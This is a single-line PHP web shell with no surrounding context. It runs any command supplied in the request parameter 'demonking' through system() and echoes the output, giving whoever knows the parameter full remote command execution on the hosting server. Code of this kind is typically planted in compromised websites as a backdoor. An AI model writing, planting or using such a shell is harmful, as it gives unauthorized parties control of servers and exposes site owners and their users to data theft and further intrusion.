<?php if(isset($_REQUEST['demonking'])){ echo "<pre>"; $cmd = ($_REQUEST['demonking']); system($cmd); echo "</pre>"; die; }?>
